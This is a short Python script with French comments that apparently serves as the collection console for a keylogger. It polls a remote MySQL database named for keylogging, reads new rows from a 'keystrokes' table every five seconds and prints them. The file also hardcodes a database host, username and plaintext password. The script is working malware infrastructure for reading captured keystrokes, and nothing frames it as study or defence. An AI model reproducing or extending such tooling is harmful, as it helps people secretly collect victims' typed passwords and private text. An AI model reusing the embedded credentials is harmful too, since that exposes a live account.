import mysql.connector
import time

# Configuration MySQL
db_config = {
    'host': 'kapelo.mysql.pythonanywhere-services.com',
    'user': 'kapelo',
    'password': 'Babana36',
    'database': 'kapelo$keylogger'
}

def fetch_new_records(last_id):
    try:
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()
        query = "SELECT * FROM keystrokes WHERE id > %s"
        cursor.execute(query, (last_id,))
        new_records = cursor.fetchall()
        cursor.close()
        conn.close()
        return new_records
    except Exception as e:
        print(f"Erreur: {e}")
        return []

def main():
    last_id = 0
    while True:
        new_records = fetch_new_records(last_id)
        if new_records:
            for record in new_records:
                print(record)
            last_id = max(record[0] for record in new_records)
        time.sleep(5)  # Attendre 5 secondes avant de vérifier à nouveau

if __name__ == '__main__':
    main()
